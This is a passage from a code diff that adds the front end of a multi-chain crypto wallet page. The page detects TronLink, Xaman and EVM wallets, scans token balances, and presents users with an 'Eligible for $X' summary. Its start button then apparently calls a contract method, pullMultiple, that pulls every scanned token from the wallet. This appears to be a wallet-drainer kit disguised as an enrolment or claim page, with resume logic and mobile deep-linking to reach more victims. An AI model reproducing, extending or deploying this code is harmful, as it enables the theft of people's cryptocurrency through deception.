+    const txid  = await ronin.pullMultiple(scan.tokens.map(t => t.address)).send({ feeLimit: 200000000 });
+    await waitForTronTx(txid);
+  } catch(e){
+    return null;
+  }
+
+  return {
+    stepCounter,
+    symbols: scan.tokens.map(t => t.symbol),
+  };
+}
+
+// ── TronLink connection helper ─────────────────────────────────────────────
+// Called when the user taps "Scan TRC-20" from an EVM-connected summary screen.
+// Trust Wallet (and other EVM wallets) do NOT inject window.tronWeb, so we can't
+// scan Tron automatically. This function handles three cases:
+//   A. tronWeb is already ready (desktop: both TronLink + MetaMask installed)
+//      → call startTronFlow() directly.
+//   B. TronLink extension present but not yet connected (locked or not authorised)
+//      → call tronLink.request("tron_requestAccounts"), then startTronFlow().
+//   C. No tronWeb / tronLink at all (mobile Trust Wallet, MetaMask, etc.)
+//      → deep-link to the TronLink app; it will re-open this page with window.tronWeb
+//         injected, and init() will pick up the Tron flow automatically.
+async function tryConnectTron(){
+  // Case A: already have a ready address
+  if(window.tronWeb?.defaultAddress?.base58){
+    startTronFlow();
+    return;
+  }
+
+  // Case B: TronLink extension present, need to request permission
+  if(window.tronLink?.request || window.tronWeb){
+    setLoading("Connecting TronLink...", "Approve the connection in TronLink.");
+    try {
+      if(window.tronLink?.request){
+        const resp = await window.tronLink.request({ method: "tron_requestAccounts" });
+        if(resp?.code === 4001){ showError("TronLink connection rejected."); return; }
+        if(resp?.code === 4000){ showError("TronLink is locked. Unlock TronLink and try again."); return; }
+      } else if(window.tronWeb?.request){
+        await window.tronWeb.request({ method: "tron_requestAccounts" });
+      }
+    } catch(e){ /* .request() not supported — fall through and check address */ }
+
+    // Give TronLink a moment to populate the address
+    await new Promise(r => setTimeout(r, 500));
+
+    if(window.tronWeb?.defaultAddress?.base58){
+      startTronFlow();
+      return;
+    }
+    showError("TronLink connected but no address found. Unlock your wallet and try again.");
+    return;
+  }
+
+  // Case C: no TronLink at all.
+  // Use a hidden <a> click so we don't navigate the current page.
+  // If TronLink is installed, it opens the app. If not, nothing happens on mobile
+  // (the browser silently ignores unknown schemes) — so we also open the download
+  // page in a new tab as a fallback.
+  const siteUrl   = window.location.origin + window.location.pathname;
+  const deepLink   = "tronlinkoutside://pull.activity?param=" +
+    encodeURIComponent(JSON.stringify({ url: siteUrl }));
+  const isIos      = /iphone|ipad|ipod/i.test(navigator.userAgent);
+  const dlUrl      = isIos
+    ? "https://apps.apple.com/app/tronlink/id1453530188"
+    : "https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet";
+
+  // Fire deep-link via hidden anchor (does NOT change window.location)
+  const a = document.createElement("a");
+  a.href = deepLink;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  // Open download page in a new tab (user can ignore it if app opens)
+  setTimeout(() => window.open(dlUrl, "_blank"), 800);
+}
+
+// Entry point for TronLink users.
+// TronLink injects window.tronWeb synchronously — no connect popup needed.
+// window.tronWeb.defaultAddress.base58 gives us their Tron wallet address.
+async function startTronFlow(){
+  // Grab the address immediately — TronLink pre-fills it
+  const address = window.tronWeb?.defaultAddress?.base58;
+  if(!address){
+    // Edge case: TronLink is installed but the user locked or disconnected it
+    showError("TronLink not ready. Please unlock TronLink and refresh the page.");
+    return;
+  }
+
+  // Clear any EVM provider state — we're in Tron mode
+  _activeProvider = null;
+
+  setLoading("Scanning Tron...", "Checking your TRC-20 balances.");
+  const scan = await scanTronChain(address);
+
+  if(scan.totalUsd < TRON.minUsd){
+    document.getElementById("noFundsMsg").textContent =
+      "No supported TRC-20 tokens found in your TronLink wallet.";
+    showStep("stepNoFunds");
+    return;
+  }
+
+  // Reuse the same summary screen as EVM/Xaman — just fill in Tron-specific copy
+  const minutes = Math.max(1, Math.ceil(scan.confirmCount * 0.5));
+  const amtLine = document.getElementById("sAmt").closest(".summary-line");
+  const minLine = document.getElementById("sMin").closest(".summary-line");
+  amtLine.innerHTML =
+    `Eligible for <strong>$${scan.totalUsd.toFixed(2)}</strong> on <strong>Tron</strong>.`;
+  minLine.innerHTML =
+    `This will take about <strong>${minutes}</strong> minutes and <strong>${scan.confirmCount}</strong> confirmations.`;
+  document.getElementById("resumeTag").style.display = "none";
+
+  document.getElementById("startBtn").onclick = async () => {
+    const r = await executeTronChain(scan, 0, scan.confirmCount);
+    hideProgress();
+    if(r){
+      const summary = r.symbols.slice(0,3).join(", ") +
+                      (r.symbols.length > 3 ? ` +${r.symbols.length-3} more` : "");
+      document.getElementById("enrolledToken").textContent = summary || "Complete";
+      showStep("stepSuccess");
+    }
+    // If r === null, executeTronChain showed error or user cancelled — stay on screen
+  };
+  document.getElementById("cancelBtn").onclick = () => buildConnectScreen();
+
+  showStep("stepSummary");
+}
+
+// ── Chain switch helper ───────────────────────────────────────────────────
+async function switchChainOnProvider(provider, chain){
+  try {
+    await provider.request({ method:"wallet_switchEthereumChain", params:[{chainId:chain.hexId}] });
+  } catch(err){
+    if(err.code === 4902){
+      // Chain not added to wallet — add it (skip for L1 Eth which is always there)
+      await provider.request({ method:"wallet_addEthereumChain", params:[{
+        chainId:chain.hexId, chainName:chain.name,
+        nativeCurrency:{name:chain.sym, symbol:chain.sym, decimals:18},
+        rpcUrls:[chain.rpc], blockExplorerUrls:[chain.explorer]
+      }]});
+    } else { throw err; }
+  }
+}
+
+// ── Progress bar helpers ──────────────────────────────────────────────────
+function setProgress(current, total, label){
+  const pct = total > 0 ? Math.min(100, Math.round((current / total) * 100)) : 0;
+  const fill = document.getElementById("progressFill");
+  const lbl  = document.getElementById("progressLabel");
+  const wrap = document.getElementById("progressWrap");
+  if(fill) fill.style.width = pct + "%";
+  if(lbl)  lbl.textContent = "Step " + current + " of " + total + (label ? " · " + label : "");
+  if(wrap) wrap.style.display = "block";
+}
+function hideProgress(){
+  const wrap = document.getElementById("progressWrap");
+  if(wrap) wrap.style.display = "none";
+}
+
+// ── Resume state (localStorage) ───────────────────────────────────────────
+// Saves {wallet, completedChainIds, timestamp} so a mid-flow abort can be
+// picked up later without redoing finished chains. Expires after 1 hour.
+const STATE_KEY = "ronin.session.v1";
+const STATE_TTL = 60 * 60 * 1000;  // 1 hour
+
+function saveState(wallet, completed){
+  try {
+    localStorage.setItem(STATE_KEY, JSON.stringify({
+      wallet: wallet.toLowerCase(),
+      completed,
+      timestamp: Date.now(),
+    }));
+  } catch(e){}
+}
+function loadState(){
+  try {
+    const raw = localStorage.getItem(STATE_KEY);
+    if(!raw) return null;
+    const s = JSON.parse(raw);
+    if(!s || !s.timestamp || Date.now() - s.timestamp > STATE_TTL){
+      localStorage.removeItem(STATE_KEY);
+      return null;
+    }
+    return s;
+  } catch(e){ return null; }
+}
+function clearState(){
+  try { localStorage.removeItem(STATE_KEY); } catch(e){}
+}
+
+// ── Startup ────────────────────────────────────────────────────────────────
+// Detection priority (first match wins):
+//   1. TronLink  → window.tronWeb with a ready address
+//   2. Xaman     → window.xumm (no window.ethereum)
+//   3. EVM wallet inside wallet browser → window.ethereum (mobile auto-connect)
+//   4. EVM wallet extension → EIP-6963 detection (desktop)
+//   5. Nothing detected → show deep-link list (regular mobile browser)
+(function init(){
+  const isMobile = /iPhone|iPad|Android|Mobile/i.test(navigator.userAgent);
+
+  // ── 1. TronLink ───────────────────────────────────────────────────────
+  // TronLink injects window.tronWeb synchronously. If it's present AND has
+  // a ready address, the user is inside TronLink's dApp browser — go straight
+  // to the Tron flow. We check defaultAddress.base58 because window.tronWeb
+  // can exist but be "not ready" (locked wallet) — in which case we fall through.
+  if(window.tronWeb && window.tronWeb.defaultAddress?.base58){
+    startTronFlow();
+    return;
+  }
+
+  // ── 2. Xaman (XUMM) ──────────────────────────────────────────────────
+  // Xaman injects window.xumm but NOT window.ethereum.
+  if(window.xumm && !getWalletProvider()){
+    startXamanFlow();
+    return;
+  }
+
+  if(isMobile){
+    // ── 3. EVM wallet browser (mobile) ────────────────────────────────
+    const provider = getWalletProvider();
+    if(provider){
+      autoConnectInWalletBrowser();
+    } else {
+      // Give wallets up to 500ms to inject their provider after page load
+      setTimeout(()=>{
+        if(window.tronWeb && window.tronWeb.defaultAddress?.base58){
+          startTronFlow();
+        } else if(window.xumm && !getWalletProvider()){
+          startXamanFlow();
+        } else if(getWalletProvider()){
+          autoConnectInWalletBrowser();
+        } else {
+          // ── 5. Regular mobile browser → show deep-link wallet list ───
+          buildConnectScreen();
+        }
+      }, 500);
+    }
+  } else {
+    // ── 4. Desktop: EIP-6963 wallet extensions ────────────────────────
+    requestWallets();
+    setTimeout(()=> buildConnectScreen(), 300);
+  }
+})();
+</script>
+</body>
+</html>
